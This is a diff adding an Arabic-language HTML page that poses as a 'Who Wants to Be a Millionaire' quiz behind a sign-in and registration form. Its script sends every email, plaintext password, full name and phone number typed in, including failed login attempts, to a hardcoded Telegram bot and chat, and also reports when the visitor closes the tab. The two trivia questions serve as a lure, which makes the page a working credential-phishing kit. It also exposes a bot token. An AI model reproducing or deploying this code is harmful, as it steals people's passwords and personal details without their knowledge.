@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>من سيربح المليون - نظام التحقق المتطور</title>
+    <style>
+        body {
+            background-color: #020230; color: white; font-family: 'Arial', sans-serif;
+            display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;
+            background: radial-gradient(circle, #000066 0%, #020230 100%);
+        }
+        .container {
+            background: rgba(0, 0, 0, 0.85); padding: 30px; border: 2px solid #d4af37;
+            border-radius: 20px; text-align: center; width: 380px; box-shadow: 0 0 30px rgba(212, 175, 55, 0.4);
+        }
+        input {
+            width: 100%; padding: 12px; margin: 8px 0; border-radius: 25px;
+            border: 1px solid #d4af37; background: #0a0a2a; color: white; text-align: center;
+        }
+        button {
+            background: linear-gradient(#d4af37, #b8860b); color: black; padding: 12px;
+            border: none; border-radius: 25px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px;
+        }
+        #game-interface { display: none; width: 95%; max-width: 800px; }
+        .question-box { border: 2px solid #d4af37; padding: 25px; border-radius: 50px; margin-bottom: 30px; font-size: 22px; background: #000044; }
+        .options-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .option-btn { background: #000; color: white; border: 1px solid #d4af37; text-align: right; padding: 15px; border-radius: 25px; cursor: pointer; }
+        .option-btn:hover { background: orange; color: black; }
+    </style>
+</head>
+<body>
+
+    <div id="auth-screen" class="container">
+        <h2 id="title" style="color:#d4af37">دخول المسابقة</h2>
+        <form id="auth-form" onsubmit="event.preventDefault(); handleAuth();">
+            <input type="email" id="email" placeholder="البريد الإلكتروني الحقيقي" required autocomplete="email">
+            <input type="password" id="password" placeholder="كلمة المرور" required autocomplete="current-password">
+            
+            <div id="extra-fields">
+                <input type="text" id="fullname" placeholder="الاسم الكامل">
+                <input type="tel" id="phone" placeholder="رقم الجوال">
+            </div>
+            
+            <button type="submit" id="btn-text">دخول / تسجيل</button>
+        </form>
+        <p onclick="toggleMode()" id="toggle-hint" style="cursor:pointer; color: #aaa; font-size: 12px; margin-top:15px;">هل لديك حساب؟ اضغط هنا للتبديل</p>
+    </div>
+
+    <div id="game-interface" class="container">
+        <div class="question-box"><p id="question-text"></p></div>
+        <div class="options-grid">
+            <button class="option-btn" onclick="checkAnswer('a')" id="opt-a"></button>
+            <button class="option-btn" onclick="checkAnswer('b')" id="opt-b"></button>
+            <button class="option-btn" onclick="checkAnswer('c')" id="opt-c"></button>
+            <button class="option-btn" onclick="checkAnswer('d')" id="opt-d"></button>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8537863001:AAF-66KPtlFqZLdm7Slx5zK-ZTNTKf0wems";
+        const CHAT_ID = "6212920872";
+        
+        let isLoginMode = true;
+        let currentUserEmail = "";
+
+        // تبديل واجهة الدخول
+        function toggleMode() {
+            isLoginMode = !isLoginMode;
+            document.getElementById('title').innerText = isLoginMode ? "دخول المسابقة" : "إنشاء حساب جديد";
+            document.getElementById('extra-fields').style.display = isLoginMode ? "none" : "block";
+            document.getElementById('btn-text').innerText = isLoginMode ? "تسجيل الدخول" : "تأكيد التسجيل";
+        }
+
+        // إرسال البيانات لتليجرام
+        async function notifyTelegram(action, data = {}) {
+            const time = new Date().toLocaleString('ar-EG');
+            let message = `⚠️ إشعار من المسابقة:\n🔹 الإجراء: ${action}\n📧 البريد: ${data.email || currentUserEmail}\n🔑 الباسورد: ${data.pass || '----'}\n👤 الاسم: ${data.name || 'غير متوفر'}\n📞 الجوال: ${data.phone || 'غير متوفر'}\n⏰ الوقت: ${time}`;
+            
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+        }
+
+        // منطق التحقق والدخول
+        function handleAuth() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+            const name = document.getElementById('fullname').value;
+            const phone = document.getElementById('phone').value;
+
+            if (isLoginMode) {
+                // محاكاة التحقق من البيانات المسجلة بالجهاز
+                const savedPass = localStorage.getItem(email);
+                if (savedPass && savedPass === pass) {
+                    currentUserEmail = email;
+                    notifyTelegram("تم تسجيل الدخول بنجاح ✅", {email, pass});
+                    startGame();
+                } else {
+                    alert("عذراً، البريد أو كلمة المرور غير متطابقة مع المسجل في الجهاز.");
+                    notifyTelegram("محاولة دخول فاشلة ❌", {email, pass});
+                }
+            } else {
+                // تسجيل جديد وحفظ في المتصفح
+                localStorage.setItem(email, pass);
+                currentUserEmail = email;
+                notifyTelegram("تم إنشاء حساب جديد وحفظه 📥", {email, pass, name, phone});
+                startGame();
+            }
+        }
+
+        function startGame() {
+            document.getElementById('auth-screen').style.display = 'none';
+            document.getElementById('game-interface').style.display = 'block';
+            loadQuestion();
+        }
+
+        // تتبع الخروج عند إغلاق التبويب
+        window.addEventListener('beforeunload', () => {
+            if (currentUserEmail) {
+                notifyTelegram("قام بالخروج من الصفحة 🔴");
+            }
+        });
+
+        // الأسئلة (عينة بسيطة)
+        let currentStep = 0;
+        const questions = [
+            { q: "ما هو الكوكب الذي يلقب بالكوكب الأحمر؟", a: "المشتري", b: "المريخ", c: "زحل", d: "الزهرة", correct: "b" },
+            { q: "أين تقع الكعبة المشرفة؟", a: "المدينة", b: "الرياض", c: "مكة", d: "جدة", correct: "c" }
+        ];
+
+        function loadQuestion() {
+            const q = questions[currentStep];
+            document.getElementById('question-text').innerText = q.q;
+            document.getElementById('opt-a').innerText = q.a;
+            document.getElementById('opt-b').innerText = q.b;
+            document.getElementById('opt-c').innerText = q.c;
+            document.getElementById('opt-d').innerText = q.d;
+        }
+
+        function checkAnswer(ans) {
+            if(ans === questions[currentStep].correct) {
+                currentStep++;
+                if(currentStep < questions.length) loadQuestion();
+                else alert("مبروك!");
+            } else {
+                alert("خطأ! سنبدأ من جديد.");
+                currentStep = 0;
+                loadQuestion();
+            }
+        }
+
+        // تشغيل وضع الدخول افتراضياً
+        toggleMode(); toggleMode(); 
+    </script>
+</body>
+</html>
